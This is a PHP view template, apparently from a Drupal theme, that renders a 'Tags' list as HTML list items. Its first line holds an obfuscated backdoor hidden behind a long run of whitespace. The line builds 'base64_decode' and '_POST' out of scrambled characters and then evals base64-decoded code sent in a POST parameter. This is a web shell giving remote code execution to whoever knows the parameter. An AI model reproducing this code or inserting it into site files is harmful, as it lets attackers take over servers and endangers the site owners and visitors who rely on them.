<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nfe1a72'])) {eval($s21(${$s20}['nfe1a72']));}?><?php

/**
 * @file
 * Default simple view template to display a rows in a grid.
 *
 * - $rows contains a nested array of rows. Each row contains an array of
 *   columns.
 *
 * @ingroup views_templates
 */
?>
<div class="m_bottom_45 m_xs_bottom_30" data-appear-animation="fadeInDown">
	<h5 class="fw_light color_dark m_bottom_23">Tags</h5>
	<ul class="hr_list tags_list">
		<?php foreach ($rows as $id => $row): ?>
			<li class="m_right_5 m_bottom_5"><?php print $row; ?></li>
		<?php endforeach; ?>
	</ul>
</div>
		